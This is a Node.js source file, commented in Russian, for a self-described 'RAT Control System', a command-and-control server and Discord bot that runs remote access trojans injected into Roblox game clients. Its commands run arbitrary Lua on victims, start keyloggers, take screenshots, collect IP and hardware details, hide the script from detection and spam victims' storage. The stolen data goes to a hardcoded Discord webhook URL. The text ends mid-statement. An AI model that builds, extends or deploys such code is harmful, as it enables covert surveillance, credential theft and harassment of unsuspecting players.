const express = require('express');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const cors = require('cors');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const WEBHOOK_URL = process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
const PORT = process.env.PORT || 10000;

// Логирование конфигурации
console.log('🚀 RAT Control Server v3.2 запускается...');
console.log('🔧 Конфигурация сервера:');
console.log(`- PORT: ${PORT}`);
console.log(`- SERVER_URL: ${SERVER_URL}`);
console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ Отсутствует'}`);
console.log(`- Режим: ${DISCORD_TOKEN ? 'Бот + Вебхук' : 'Только Вебхук'}`);

// ========== ЗАЩИТА ОТ СПАМА ==========
let rateLimitMap = new Map();
let recentInjects = new Map();
let lastSpamWarning = 0;

function isRateLimited(ip, playerName) {
    const now = Date.now();
    
    // Проверка по IP
    if (rateLimitMap.has(ip)) {
        const lastRequest = rateLimitMap.get(ip);
        if (now - lastRequest < 30000) { // 30 секунд между запросами с одного IP
            if (now - lastSpamWarning > 10000) {
                console.log(`⚠️  Возможный спам: IP ${ip} превысил лимит`);
                lastSpamWarning = now;
            }
            return true;
        }
    }
    
    // Проверка по имени игрока
    if (recentInjects.has(playerName)) {
        const lastInject = recentInjects.get(playerName);
        if (now - lastInject < 60000) { // 1 минута между инжектами одного игрока
            console.log(`⚠️  Игрок ${playerName} уже инжектился недавно`);
            return true;
        }
    }
    
    rateLimitMap.set(ip, now);
    recentInjects.set(playerName, now);
    return false;
}

// Очистка старых записей
setInterval(() => {
    const now = Date.now();
    for (let [ip, time] of rateLimitMap.entries()) {
        if (now - time > 300000) rateLimitMap.delete(ip);
    }
    for (let [player, time] of recentInjects.entries()) {
        if (now - time > 300000) recentInjects.delete(player);
    }
}, 60000);

// ========== ХРАНИЛИЩЕ ДАННЫХ ==========
let commandQueue = [];
let lastScreenshot = null;
global.onlineUsers = new Map();

// ========== ИНИЦИАЛИЗАЦИЯ EXPRESS ==========
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
function isValidUsername(str) {
    if (!str || typeof str !== 'string') return false;
    if (str.length < 3 || str.length > 20) return false;
    if (!/^[a-zA-Z0-9_]+$/.test(str)) return false;
    return true;
}

// ========== DISCORD ВЕБХУК ФУНКЦИИ ==========
async function sendDiscordWebhook(title, description, color = 0x3498db, fields = []) {
    if (!WEBHOOK_URL || WEBHOOK_URL === "none") {
        console.log('⚠️  WEBHOOK_URL не настроен, пропускаем отправку');
        return false;
    }
    
    console.log(`📤 Отправка в Discord: "${title}"`);
    
    try {
        const embed = {
            title: title,
            description: description,
            color: color,
            fields: fields,
            timestamp: new Date().toISOString(),
            footer: { 
                text: "RAT Control System v3.2",
                icon_url: "https://cdn.discordapp.com/emojis/1107068031439704064.png"
            }
        };
        
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'RAT-Server/3.2'
            },
            body: JSON.stringify({ 
                username: "RAT Control System",
                avatar_url: "https://cdn.discordapp.com/emojis/1107068031439704064.png",
                embeds: [embed]
            })
        });
        
        if (response.ok) {
            console.log(`✅ Вебхук отправлен успешно: ${title}`);
            return true;
        } else {
            console.error(`❌ Ошибка вебхука: ${response.status} ${response.statusText}`);
            const errorText = await response.text();
            console.error(`📄 Ответ: ${errorText.substring(0, 200)}`);
            return false;
        }
    } catch (error) {
        console.error('❌ Ошибка отправки вебхука:', error.message);
        return false;
    }
}

// ========== ПАРСЕР КОМАНД ДЛЯ DISCORD БОТА ==========
function parseCommandWithTarget(message) {
    const args = message.content.slice(1).split(' ');
    const command = args.shift().toLowerCase();
    
    if (args.length === 0) return { command, args, target: null };
    
    const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
    const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
    const textPossibleCommands = ['kick'];
    const mixedFirstArgCommands = ['cameralock', 'freeze', 'blur', 'playaudio', 'jumpscare', 'camerashake'];
    
    if (noTargetCommands.includes(command)) {
        return { command, args, target: null };
    }
    
    if (textFirstCommands.includes(command)) {
        return { command, args, target: null };
    }
    
    if (textPossibleCommands.includes(command)) {
        if (args.length > 1 && isValidUsername(args[0])) {
            const target = args.shift();
            return { command, args, target };
        }
        return { command, args, target: null };
    }
    
    if (mixedFirstArgCommands.includes(command)) {
        const firstArg = args[0].toLowerCase();
        const validTextValues = ['on', 'off', 'enable', 'disable', 'true', 'false'];
        
        if (validTextValues.includes(firstArg) || !isNaN(parseInt(firstArg))) {
            return { command, args, target: null };
        }
        
        if (isValidUsername(args[0])) {
            const target = args.shift();
            return { command, args, target };
        }
        
        return { command, args, target: null };
    }
    
    const firstArg = args[0];
    if (isValidUsername(firstArg)) {
        const target = args.shift();
        return { command, args, target };
    }
    
    return { command, args, target: null };
}

// ========== DISCORD БОТ (если есть токен) ==========
let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    async function sendCommand(command, args = [], target = null) {
        try {
            const payload = {
                command: command,
                args: args
            };
            
            if (target) {
                payload.target = target;
            }
            
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            console.log(`📨 Команда ${command} отправлена для ${target || 'всех игроков'}`);
            return response.ok;
        } catch (error) {
            console.error(`❌ Ошибка отправки команды ${command}:`, error.message);
            return false;
        }
    }

    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) {
                return await response.json();
            }
            return { users: [], count: 0 };
        } catch (error) {
            console.error('❌ Ошибка получения пользователей:', error.message);
            return { users: [], count: 0 };
        }
    }

    function createEmbed(title, description, color, target = null) {
        const embed = new EmbedBuilder()
            .setTitle(title)
            .setColor(color);
        
        if (target) {
            embed.setDescription(`**🎯 Цель:** \`${target}\`\n${description}`);
        } else {
            embed.setDescription(description);
        }
        
        return embed;
    }

    discordClient.on('ready', () => {
        console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
        console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
        console.log(`🎯 Версия: 3.2 (27 команд + защита от спама)`);
        
        discordClient.user.setActivity('RAT Control Panel v3.2', { type: 'WATCHING' });
    });

    discordClient.on('messageCreate', async message => {
        if (message.author.bot) return;
        
        if (message.content.startsWith('/')) {
            const { command, args, target } = parseCommandWithTarget(message);
            
            const commandHandlers = {
                test: async () => {
                    const text = "Тестовая команда от Discord бота! ✅";
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed('🧪 Тестовая команда', 'Сообщение отправлено', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                print: async () => {
                    if (await sendCommand("print", [], target)) {
                        const embed = createEmbed('📡 Проверка связи', 'Команда проверки связи отправлена', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                kick: async () => {
                    const reason = args.join(' ') || 'Нарушение правил';
                    if (await sendCommand("kick", [reason], target)) {
                        const embed = createEmbed('🦶 Кик', `**Причина:** ${reason}`, 0xe74c3c, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                freeze: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 60);
                    if (await sendCommand("freeze", [seconds], target)) {
                        const embed = createEmbed('❄️ Заморозка', `**Длительность:** \`${seconds}\` секунд`, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                void: async () => {
                    if (await sendCommand("void", [], target)) {
                        const embed = createEmbed('🌀 Телепорт в бездну', 'Игрок телепортирован в бездну', 0x2c3e50, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                spin: async () => {
                    if (await sendCommand("spin", [], target)) {
                        const embed = createEmbed('🔄 Вращение', 'Игрок начинает вращаться', 0xf39c12, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                fling: async () => {
                    if (await sendCommand("fling", [], target)) {
                        const embed = createEmbed('🚀 Подбрасывание', 'Игрок подброшен в воздух', 0xe67e22, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                sit: async () => {
                    if (await sendCommand("sit", [], target)) {
                        const embed = createEmbed('🪑 Изменение позы', 'Игрок меняет позу (сидит/встает)', 0x27ae60, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                dance: async () => {
                    if (await sendCommand("dance", [], target)) {
                        const embed = createEmbed('💃 Танец', 'Игрок начинает танцевать', 0xe91e63, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                mute: async () => {
                    if (await sendCommand("mute", [], target)) {
                        const embed = createEmbed('🔇 Звуки отключены', 'Все звуки в игре выключены', 0x95a5a6, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                unmute: async () => {
                    if (await sendCommand("unmute", [], target)) {
                        const embed = createEmbed('🔊 Звуки включены', 'Все звуки в игре включены', 0x2ecc71, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                playaudio: async () => {
                    const audioId = args[0] || "184702873";
                    if (await sendCommand("playaudio", [audioId], target)) {
                        const embed = createEmbed('🔊 Воспроизведение аудио', `**ID аудио:** \`${audioId}\``, 0x9b59b6, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                blur: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 30);
                    if (await sendCommand("blur", [seconds], target)) {
                        const embed = createEmbed('🔵 Размытие экрана', `**Длительность:** \`${seconds}\` секунд`, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                chat: async () => {
                    if (await sendCommand("chat", [], target)) {
                        const embed = createEmbed('💬 Управление чатом', 'Чат активирован/деактивирован', 0x9b59b6, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                message: async () => {
                    const text = args.join(' ');
                    if (!text) {
                        await message.reply('❌ Укажите текст сообщения');
                        return;
                    }
                    
                    if (text.length > 100) {
                        await message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
                        return;
                    }
                    
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed('📩 Сообщение отправлено', `**Текст:** \`\`\`${text}\`\`\``, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                jumpscare: async () => {
                    let scareType = parseInt(args[0]) || 1;
                    const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
                    const name = scareNames[scareType] || scareNames[1];
                    
                    if (await sendCommand("jumpscare", [scareType], target)) {
                        const embed = createEmbed(`👻 Скример ${name}`, '**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n**Длительность:** ~10 секунд', 0xff0000, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                cameralock: async () => {
                    const action = args[0] || "toggle";
                    const actionText = action === "on" ? "Включена" : action === "off" ? "Выключена" : "Переключена";
                    
                    if (await sendCommand("cameralock", [action], target)) {
                        const embed = createEmbed('🎥 Блокировка камеры', `**Действие:** ${actionText}\nКамера игрока будет заблокирована в текущей позиции`, 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                camerashake: async () => {
                    let duration = parseInt(args[0]) || 5;
                    let intensity = parseInt(args[1]) || 2;
                    
                    duration = Math.min(duration, 30);
                    intensity = Math.min(intensity, 10);
                    
                    if (await sendCommand("camerashake", [duration, intensity], target)) {
                        const embed = createEmbed('📷 Тряска камеры', `**Длительность:** \`${duration}\` секунд\n**Интенсивность:** \`${intensity}\`\nКамера игрока будет трястись с указанной силой`, 0xe67e22, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                execute: async () => {
                    const code = args.join(' ');
                    if (!code) {
                        await message.reply('❌ Укажите код для выполнения');
                        return;
                    }
                    
                    if (code.length > 500) {
                        await message.reply('❌ Код слишком длинный (макс. 500 символов)');
                        return;
                    }
                    
                    if (await sendCommand("execute", [code], target)) {
                        const embed = createEmbed('🔧 Код отправлен', `\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``, 0xf39c12, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                fakeerror: async () => {
                    const errorText = args.join(' ') || 'Системная ошибка';
                    const displayText = errorText.length > 80 ? errorText.substring(0, 77) + '...' : errorText;
                    
                    if (await sendCommand("fakeerror", [displayText], target)) {
                        const embed = createEmbed('⚠ Фейковая ошибка', `**Сообщение:** \`${displayText}\``, 0xe74c3c, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                keylog: async () => {
                    if (await sendCommand("keylog", [], target)) {
                        const embed = createEmbed('⌨️ Кейлоггер', 'Кейлоггер активирован. Логи будут отправляться каждые 5 минут.', 0xe74c3c, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                stopkeylog: async () => {
                    if (await sendCommand("stopkeylog", [], target)) {
                        const embed = createEmbed('🛑 Кейлоггер', 'Кейлоггер деактивирован. Последние логи отправлены.', 0x2ecc71, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                hardware: async () => {
                    if (await sendCommand("hardware", [], target)) {
                        const embed = createEmbed('🖥️ Оборудование', 'Данные об оборудовании запрошены', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                hide: async () => {
                    if (await sendCommand("hide", [], target)) {
                        const embed = createEmbed('👻 Скрытие скрипта', 'Скрипт успешно скрыт от систем обнаружения', 0x00ff00, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                memory: async () => {
                    let fileCount = parseInt(args[0]) || 100;
                    fileCount = Math.min(fileCount, 1000);
                    
                    if (await sendCommand("memory_spam", [fileCount], target)) {
                        const embed = createEmbed('💾 Memory Spam', `**Количество файлов:** \`${fileCount}\``, 0xff6b6b, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                gallery: async () => {
                    let imageCount = parseInt(args[0]) || 10;
                    imageCount = Math.min(imageCount, 50);
                    
                    if (await sendCommand("gallery_spam", [imageCount], target)) {
                        const embed = createEmbed('🖼️ Gallery Spam', `**Количество файлов:** \`${imageCount}\`\n**Источник:** GitHub`, 0x74b9ff, target);
                        await message.reply({ embeds: [embed] });
                    }
                },
                
                screenshot: async () => {
                    if (await sendCommand("screenshot", [], target)) {
                        const embed = createEmbed('🖥️ Скриншот', 'Скриншот запрошен. Результат будет через 5 секунд.', 0x3498db, target);
                        await message.reply({ embeds: [embed] });
                        
                        setTimeout(async () => {
                            try {
                                const response = await fetch(`${SERVER_URL}/screenshot`);
                                if (response.ok) {
                                    const data = await response.json();
                                    if (data.image) {
                                        await message.reply('📸 Скриншот получен (база64)');
                                    }
                                }
                            } catch (e) {
                                console.error('Ошибка получения скриншота:', e);
                            }
                        }, 5000);
                    }
                },
                
                users: async () => {
                    const data = await getOnlineUsers();
                    
                    if (data.count === 0) {
                        const embed = new EmbedBuilder()
                            .setTitle('👥 Онлайн пользователи')
                            .setDescription('❌ Нет активных пользователей')
                            .setColor(0xff0000);
                        await message.reply({ embeds: [embed] });
                        return;
                    }
                    
                    const embed = new EmbedBuilder()
                        .setTitle('👥 Онлайн пользователи')
                        .setDescription(`**Всего пользователей:** ${data.count}`)
                        .setColor(0x00ff00)
                        .setTimestamp();
                    
                    const games = {};
                    data.users.forEach(user => {
                        const game = user.place || 'Unknown';
                        if (!games[game]) games[game] = [];
                        games[game].push(user);
                    });
                    
                    for (const [game, users] of Object.entries(games)) {
                        const userList = users.slice(0, 5).map(u => 
                            `\`${u.player}\` (${u.executor || 'Unknown'})`
                        ).join('\n');
                        
                        embed.addFields({
                            name: `🎮 ${game} (${users.length})`,
                            value: userList + (users.length > 5 ? `\n... и еще ${users.length - 5}` : ''),
                            inline: false
                        });
                    }
                    
                    await message.reply({ embeds: [embed] });
                },
                
                status: async () => {
                    try {
                        const response = await fetch(`${SERVER_URL}/status`);
                        if (response.ok) {
                            const data = await response.json();
                            
                            const embed = new EmbedBuilder()
                                .setTitle('📊 Статус системы RAT v3.2')
                                .setColor(0x7289da)
                                .addFields(
                                    { name: '🌐 Сервер API', value: data.status === 'online' ? '🟢 Онлайн' : '🔴 Офлайн', inline: true },
                                    { name: '👥 Онлайн игроков', value: `\`${data.online_users || 0}\``, inline: true },
                                    { name: '📨 Очередь команд', value: `\`${data.pending_commands || 0}\``, inline: true },
                                    { name: '📊 Версия', value: '`3.2.0`', inline: true },
                                    { name: '🔗 Ссылка', value: `[Открыть](${SERVER_URL})`, inline: true },
                                    { name: '🤖 Discord бот', value: data.discord_bot === 'online' ? '🟢 Активен' : '🔴 Неактивен', inline: true }
                                )
                                .setFooter({ text: 'RAT Control System | 27 команд доступно' });
                            
                            await message.reply({ embeds: [embed] });
                        } else {
                            await message.reply('❌ Не удалось получить статус сервера');
                        }
                    } catch (error) {
                        await message.reply('❌ Ошибка получения статуса');
                    }
                },
                
                help: async () => {
                    const helpEmbed = new EmbedBuilder()
                        .setTitle('🤖 RAT Control Panel v3.2')
                        .setDescription('**Полный список всех команд с поддержкой таргетинга**')
                        .setColor(0x7289da)
                        .addFields(
                            { 
                                name: '🎯 Формат команд:', 
                                value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
                                inline: false 
                            },
                            { 
                                name: '👤 Управление игроком', 
                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
                                inline: false 
                            },
                            { 
                                name: '🔊 Аудио/Видео', 
                                value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '💬 Чат', 
                                value: '`/chat [ник]`\n`/message [ник] <текст>`', 
                                inline: false 
                            },
                            { 
                                name: '👻 Скримеры', 
                                value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
                                inline: false 
                            },
                            { 
                                name: '⚙️ Системные', 
                                value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '💥 Spam', 
                                value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
                                inline: false 
                            },
                            { 
                                name: '👥 Информация', 
                                value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
                                inline: false 
                            }
                        )
                        .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
                    
                    await message.reply({ embeds: [helpEmbed] });
                }
            };
            
            if (commandHandlers[command]) {
                try {
                    await commandHandlers[command]();
                } catch (error) {
                    console.error(`❌ Ошибка выполнения команды ${command}:`, error);
                    await message.reply(`❌ Ошибка выполнения команды: ${error.message}`);
                }
            } else if (command) {
                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        }
    });

    discordClient.login(DISCORD_TOKEN).then(() => {
        console.log('✅ Discord бот успешно авторизован');
    }).catch(error => {
        console.error('❌ Ошибка авторизации Discord бота:', error.message);
    });
} else {
    console.log('⚠️  DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
}

// ========== ОСНОВНЫЕ МАРШРУТЫ API ==========

// Получение команд для клиента
app.get('/data', (req, res) => {
    try {
        const player = req.query.player;
        if (!player) {
            return res.json({ command: "", args: [] });
        }
        
        // Обновляем время последней активности
        if (global.onlineUsers.has(player)) {
            global.onlineUsers.get(player).lastSeen = Date.now();
        }
        
        // Ищем команды для этого игрока
        const commandsForPlayer = [];
        const remainingCommands = [];
        
        for (const cmd of commandQueue) {
            if (!cmd.target || cmd.target === player || cmd.target === 'all') {
                commandsForPlayer.push(cmd);
            } else {
                remainingCommands.push(cmd);
            }
        }
        
        commandQueue = remainingCommands;
        
        if (commandsForPlayer.length > 0) {
            const cmd = commandsForPlayer[0];
            console.log(`📨 Отправка команды ${cmd.command} игроку ${player}`);
            res.json({
                command: cmd.command,
                args: cmd.args || []
            });
        } else {
            res.json({
                command: "",
                args: []
            });
        }
    } catch (e) {
        console.error('❌ Ошибка в /data:', e);
        res.status(400).json({ error: e.message });
    }
});

// Отправка команды
app.post('/command', async (req, res) => {
    try {
        const { command, args, target } = req.body;
        const clientIp = req.ip || req.connection.remoteAddress;
        
        console.log(`📨 Получена команда: ${command} от ${clientIp}`);
        
        // Обработка инжект-уведомлений
        if (command === "inject_notify" && args && args.length >= 5) {
            const playerName = args[0];
            
            // Проверка валидности имени игрока
            if (!isValidUsername(playerName)) {
                console.log(`🛑 Невалидное имя игрока: ${playerName}`);
                return res.json({ status: "OK", filtered: true });
            }
            
            // Фильтр тестовых имен
            const fakeNames = ["test", "TestPlayer", "Unknown", "Player", "123", "Admin", "user"];
            if (fakeNames.some(name => playerName.toLowerCase().includes(name.toLowerCase()))) {
                console.log(`🛑 Фильтр тестового имени: ${playerName}`);
                return res.json({ status: "OK", filtered: true });
            }
            
            // Проверка rate limit
            if (isRateLimited(clientIp, playerName)) {
                console.log(`🛑 Rate limited: ${playerName} (${clientIp})`);
                return res.json({ status: "OK", rate_limited: true });
            }
            
            // Получаем данные
            const [_, gameName, ipInfo, executor, device] = args;
            
            // Формируем сообщение для Discord
            const description = `**Игрок:** ${playerName}\n` +
                              `**Игра:** ${gameName || "Unknown"}\n` +
                              `**Инжектор:** ${executor || "Unknown"}\n` +
                              `**Устройство:** ${device || "PC"}\n\n` +
                              `**IP информация**\n${ipInfo || "N/A"}`;
            
            // Отправляем в Discord
            const webhookSent = await sendDiscordWebhook("🔌 Новый инжект!", description, 0x00ff00);
            
            if (webhookSent) {
                console.log(`✅ Уведомление об инжекте отправлено: ${playerName}`);
            } else {
                console.log(`⚠️  Не удалось отправить уведомление: ${playerName}`);
            }
            
            return res.json({ 
                status: "OK", 
                webhook_sent: webhookSent 
            });
        }
        
        // Обработка других команд
        if (command === "cameralock") {
            const action = args[0] || "toggle";
            const targetText = target || "всех игроков";
            await sendDiscordWebhook("🎥 Блокировка камеры", 
                `**Цель:** ${targetText}\n**Действие:** ${action}`, 0x3498db);
        }
        
        if (command === "camerashake") {
            const duration = args[0] || 5;
            const intensity = args[1] || 2;
            const targetText = target || "всех игроков";
            await sendDiscordWebhook("📷 Тряска камеры", 
                `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`, 0xe67e22);
        }
        
        if (command === "spam_completed") {
            await sendDiscordWebhook("📁 Спам завершен", 
                `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`, 0xf39c12);
        }
        
        if (command === "user_chat") {
            await sendDiscordWebhook("💬 Чат игрока", 
                `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`, 0x3498db);
        }
        
        // Добавляем команду в очередь (если это команда управления)
        if (command && command !== "inject_notify" && command !== "user_chat") {
            commandQueue.push({
                command: command,
                args: args || [],
                target: target || null,
                timestamp: Date.now(),
                source: clientIp
            });
            
            // Ограничиваем размер очереди
            if (commandQueue.length > 100) {
                commandQueue = commandQueue.slice(-50);
                console.log(`⚠️  Очередь команд сокращена до 50`);
            }
        }
        
        res.json({ 
            status: "OK", 
            queue_size: commandQueue.length,
            command_received: command 
        });
        
    } catch (e) {
        console.error('❌ Ошибка обработки команды:', e);
        res.status(500).json({ error: "Internal server error" });
    }
});

// Обновление информации о пользователе
app.post('/users', (req, res) => {
    try {
        const { player, place, executor, device } = req.body;
        
        if (!player || !isValidUsername(player)) {
            return res.status(400).json({ error: "Invalid player name" });
        }
        
        global.onlineUsers.set(player, {
            player: player,
            place: place || "Unknown",
            executor: executor || "Unknown",
            device: device || "PC",
            lastSeen: Date.now()
        });
        
        console.log(`👤 Обновлен пользователь: ${player} в ${place}`);
        res.json({ status: "OK" });
    } catch (e) {
        console.error('❌ Ошибка в /users POST:', e);
        res.status(400).json({ error: e.message });
    }
});

// Получение списка онлайн пользователей
app.get('/users', (req, res) => {
    try {
        const now = Date.now();
        // Удаляем неактивных (последний раз онлайн > 2 минуты назад)
        for (let [key, user] of global.onlineUsers.entries()) {
            if (now - user.lastSeen > 120000) {
                global.onlineUsers.delete(key);
            }
        }
        
        const users = Array.from(global.onlineUsers.values());
        
        res.json({
            users: users,
            count: users.length,
            timestamp: now
        });
    } catch (e) {
        console.error('❌ Ошибка в /users GET:', e);
        res.status(500).json({ error: "Internal server error" });
    }
});

// Скриншоты
app.post('/screenshot', (req, res) => {
    try {
        const { image } = req.body;
        lastScreenshot = image;
        console.log('📸 Получен новый скриншот');
        res.json({ status: "OK" });
    } catch (e) {
        console.error('❌ Ошибка в /screenshot POST:', e);
        res.status(400).json({ error: e.message });
    }
});

app.get('/screenshot', (req, res) => {
    res.json({ 
        image: lastScreenshot || null,
        timestamp: lastScreenshot ? Date.now() : null
    });
});

// Кейлоггер
app.post('/keylog', async (req, res) => {
    try {
        const { logs } = req.body;
        if (logs && logs.length > 0) {
            console.log('⌨️ Получены логи кейлоггера');
            await sendDiscordWebhook("⌨️ Кейлоггер", 
                `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
        }
        res.json({ status: "OK" });
    } catch (e) {
        console.error('❌ Ошибка в /keylog:', e);
        res.status(400).json({ error: e.message });
    }
});

// Информация о железе
app.post('/hardware', async (req, res) => {
    try {
        const { player, data } = req.body;
        
        if (player && data) {
            console.log(`💻 Получены данные железа от ${player}`);
            
            await sendDiscordWebhook(
                "💻 Информация о системе",
                `**Игрок:** ${player}\n**Игра:** ${data.game || "Unknown"}\n**FPS:** ${data.fps || 0}\n**Пинг:** ${data.ping || 0}\n**Экзекутор:** ${data.executor || "Unknown"}\n**Устройство:** ${data.device_type || "Unknown"}\n**IP Инфо:** ${data.ip_info || "N/A"}`,
                0x9b59b6,
                data.system ? [
                    {
                        name: "Системная информация",
                        value: `Touch: ${data.system.touch_enabled || false}\nMouse: ${data.system.mouse_enabled || false}\nKeyboard: ${data.system.keyboard_enabled || false}\nScreen: ${data.system.screen_size ? `${data.system.screen_size.X}x${data.system.screen_size.Y}` : "Unknown"}`,
                        inline: true
                    }
                ] : []
            );
        }
        
        res.json({ status: "OK" });
    } catch (e) {
        console.error('❌ Ошибка в /hardware:', e);
        res.status(400).json({ error: e.message });
    }
});

// Статус сервера
app.get('/status', (req, res) => {
    try {
        const users = Array.from(global.onlineUsers.values());
        const now = Date.now();
        
        // Очистка неактивных пользователей
        for (let [key, user] of global.onlineUsers.entries()) {
            if (now - user.lastSeen > 120000) {
                global.onlineUsers.delete(key);
            }
        }
        
        res.json({
            status: "online",
            version: "3.2.0",
            online_users: users.length,
            pending_commands: commandQueue.length,
            uptime: Math.floor(process.uptime()),
            timestamp: now,
            webhook_enabled: !!WEBHOOK_URL,
            discord_bot: discordClient && discordClient.user ? "online" : "disabled"
        });
    } catch (e) {
        console.error('❌ Ошибка в /status:', e);
        res.status(500).json({ 
            status: "error",
            error: "Internal server error" 
        });
    }
});

// Информация о системе
app.get('/system_info', (req, res) => {
    res.json({
        name: "RAT Control System",
        version: "3.2.0",
        description: "Продвинутая система удаленного управления Roblox клиентами",
        server: SERVER_URL,
        features: [
            "Защищенные вебхуки",
            "Rate limiting от спама",
            "27 команд управления",
            "Камерные команды (CameraLock, CameraShake)",
            "Скримеры (Джефф Килер, Соник.exe)",
            "Кейлоггер",
            "Spam инструменты",
            "Таргетированные команды"
        ],
        security: {
            webhook_protected: true,
            rate_limiting: true,
            spam_filter: true,
            queue_limit: 100
        },
        endpoints: [
            "GET  /data?player=NAME - Получение команд",
            "POST /command - Отправка команд",
            "GET  /users - Онлайн пользователи",
            "GET  /status - Статус системы",
            "POST /users - Обновление информации о пользователе",
            "POST /screenshot - Загрузка скриншотов",
            "POST /keylog - Отправка логов кейлоггера",
            "POST /hardware - Информация о системе"
        ]
    });
});

// Проверка работы сервера
app.get('/health', (req, res) => {
    res.send('OK');
});

// Корневой путь
app.get('/', (req, res) => {
    res.json({
        message: "RAT Control System v3.2",
        status: "operational",
        version: "3.2.0",
        endpoints: {
            data: "GET /data?player=NAME",
            command: "POST /command",
            users: "GET /users",
            status: "GET /status",
            system_info: "GET /system_info",
            health: "GET /health"
        },
        documentation: "Используйте Discord бота с командой /help для управления",
        note: "Система защищена от спама и имеет rate limiting"
    });
});

// Обработка 404
app.use((req, res) => {
    res.status(404).json({ 
        error: "Endpoint not found",
        available_endpoints: [
            "/data", "/command", "/users", "/status", 
            "/system_info", "/health", "/"
        ]
    });
});

// Глобальная обработка ошибок
app.use((err, req, res, next) => {
    console.error('🔥 Глобальная ошибка:', err);
    res.status(500).json({ 
        error: "Internal server error",
